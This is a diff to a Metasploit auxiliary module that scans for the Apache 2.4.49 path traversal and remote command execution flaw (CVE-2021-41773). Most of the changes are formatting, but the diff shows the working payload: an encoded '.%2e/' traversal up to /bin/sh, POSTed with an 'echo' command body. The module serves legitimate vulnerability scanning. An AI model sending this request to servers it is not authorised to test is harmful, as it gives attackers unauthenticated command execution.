@@ -9,30 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'RCE Traversal in Apache 2.4.49',
-      'Description' => %q{
-        This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
-        If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
-        it can be used to execute arbitrary commands (Remote Command Execution).
-      },
-      'References' => [
-        ['CVE', '2021-41773'],
-        ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
-        ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
-      ],
-      'Author' => [
-        'Ash Daulton', # Vulnerability discovery
-        'Dhiraj Mishra', # Metasploit auxiliary module
-        'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
-      ],
-      'DisclosureDate' => '2021-05-10',
-      'License' => MSF_LICENSE,
-      'DefaultOptions' => {
-        'RPORT' => 443,
-        'SSL' => true
-      }
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Apache 2.4.49 Traversal RCE scanner',
+        'Description' => %q{
+          This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
+          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
+          it can be used to execute arbitrary commands (Remote Command Execution).
+        },
+        'References' => [
+          ['CVE', '2021-41773'],
+          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
+          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
+        ],
+        'Author' => [
+          'Ash Daulton', # Vulnerability discovery
+          'Dhiraj Mishra', # Metasploit auxiliary module
+          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
+        ],
+        'DisclosureDate' => '2021-05-10',
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
+          'RPORT' => 443,
+          'SSL' => true
+        }
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
@@ -44,16 +47,16 @@ class MetasploitModule < Msf::Auxiliary
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @proto = (ssl ? 'https' : 'http')
 
-    traversal = ".%2e/" * datastore['DEPTH'] << '/bin/sh'
+    traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
     data = Rex::Text.rand_text_alpha(4..8)
 
-    uri = normalize_uri(datastore['TARGETURI'], "#{traversal}")
+    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
     response = send_request_raw({
       'method' => 'POST',
-      'uri'    => uri,
+      'uri' => uri,
       'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;echo #{data}"
     })
     unless response
